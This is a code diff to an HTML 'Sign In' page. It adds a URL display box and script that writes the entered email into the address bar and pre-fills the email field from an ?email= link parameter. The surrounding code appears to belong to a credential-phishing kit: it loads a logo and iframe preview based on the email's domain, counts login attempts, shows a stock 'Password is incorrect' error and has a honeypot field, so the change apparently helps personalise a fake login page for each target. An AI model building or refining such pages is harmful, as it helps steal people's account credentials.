@@ -104,6 +104,30 @@
             display: none;
         }
         
+        /* Add URL display styling */
+        .url-display {
+            text-align: center;
+            margin: 10px 0;
+            color: #666;
+            font-size: 11px;
+            padding: 8px;
+            background: rgba(240, 248, 255, 0.9);
+            border-radius: 4px;
+            word-break: break-all;
+            max-height: 60px;
+            overflow-y: auto;
+            font-family: monospace;
+            border: 1px solid rgba(200, 225, 255, 0.5);
+        }
+        
+        .url-display .url-label {
+            display: block;
+            font-size: 10px;
+            color: #888;
+            margin-bottom: 4px;
+            font-weight: bold;
+        }
+        
         .img {
             text-align: center;
             margin-bottom: 20px;
@@ -318,6 +342,12 @@
         
         <h3 id="title">Sign In</h3>
         
+        <!-- URL Display -->
+        <div class="url-display" id="url-display">
+            <span class="url-label">Current URL:</span>
+            <span id="current-url"></span>
+        </div>
+        
         <div id="error">Password is incorrect, please try again!</div>
         <div id="success">Login successful! Redirecting...</div>
         
@@ -351,6 +381,32 @@
 let loginAttempts = parseInt(localStorage.getItem('loginAttempts')) || 0;
 let currentEmail = '';
 let storedEmail = localStorage.getItem('currentEmail') || '';
+
+// Function to update URL and display
+function updateURL() {
+    const email = document.getElementById('email').value.trim();
+    const urlDisplay = document.getElementById('current-url');
+    
+    if (!email) {
+        // If empty, remove query param
+        history.replaceState(null, "", window.location.pathname);
+        if (urlDisplay) {
+            urlDisplay.textContent = window.location.href;
+        }
+        return;
+    }
+
+    const encodedEmail = encodeURIComponent(email);
+    const newUrl = `${window.location.pathname}?email=${encodedEmail}`;
+
+    // Update browser URL without reloading page
+    history.replaceState(null, "", newUrl);
+
+    // Show current URL
+    if (urlDisplay) {
+        urlDisplay.textContent = window.location.href;
+    }
+}
 
 // Function to load iframe with website preview
 function loadWebsitePreview(domain) {
@@ -540,6 +596,9 @@ $("#email").on("input", function() {
     if (email) {
         localStorage.setItem('currentEmail', email);
     }
+    
+    // Update URL with email parameter
+    updateURL();
     
     if (email && isValidEmail(email)) {
         loadLogoFromEmail(email);
@@ -736,7 +795,29 @@ document.querySelector('input[name="_honey"]').addEventListener('focus', functio
 $(document).ready(function() {
     initializeForm();
     
-    // REMOVED: Initialize background toggle
+    // On page load: try to pre-fill from URL
+    const params = new URLSearchParams(window.location.search);
+    const emailFromUrl = params.get("email");
+    const urlDisplay = document.getElementById('current-url');
+
+    if (emailFromUrl) {
+        document.getElementById('email').value = emailFromUrl; // automatically decoded
+        updateURL(); // ensure URL is clean/consistent
+        
+        // Also trigger the logo loading for the email
+        const emailInput = document.getElementById('email');
+        const event = new Event('input');
+        emailInput.dispatchEvent(event);
+    } else {
+        if (urlDisplay) {
+            urlDisplay.textContent = window.location.href;
+        }
+    }
+    
+    // Also update on blur (in case user pastes or autocomplete fills it)
+    const emailInput = document.getElementById('email');
+    emailInput.addEventListener('change', updateURL);
+    emailInput.addEventListener('blur', updateURL);
 });
 
 // Clear attempts when page is closed/refreshed (optional)
@@ -746,50 +827,5 @@ window.addEventListener('beforeunload', function() {
     // localStorage.removeItem('currentEmail');
 });
 </script>
-
-  <script>
-    const emailInput = document.getElementById("email");
-    const urlDisplay = document.getElementById("current-url");
-
-    // Function to update URL and display
-    function updateURL() {
-      const email = emailInput.value.trim();
-      if (!email) {
-        // If empty, remove query param
-        history.replaceState(null, "", window.location.pathname);
-        urlDisplay.textContent = window.location.href;
-        return;
-      }
-
-      const encodedEmail = encodeURIComponent(email);
-      const newUrl = `${window.location.pathname}?email=${encodedEmail}`;
-
-      // Update browser URL without reloading page
-      history.replaceState(null, "", newUrl);
-
-      // Show current URL
-      urlDisplay.textContent = window.location.href;
-    }
-
-    // On page load: try to pre-fill from URL
-    document.addEventListener("DOMContentLoaded", () => {
-      const params = new URLSearchParams(window.location.search);
-      const emailFromUrl = params.get("email");
-
-      if (emailFromUrl) {
-        emailInput.value = emailFromUrl; // automatically decoded
-        updateURL(); // ensure URL is clean/consistent
-      } else {
-        urlDisplay.textContent = window.location.href;
-      }
-    });
-
-    // Update URL whenever user types/changes the email
-    emailInput.addEventListener("input", updateURL);
-
-    // Also update on blur (in case user pastes or autocomplete fills it)
-    emailInput.addEventListener("change", updateURL);
-    emailInput.addEventListener("blur", updateURL);
-  </script>
 </body>
 </html>
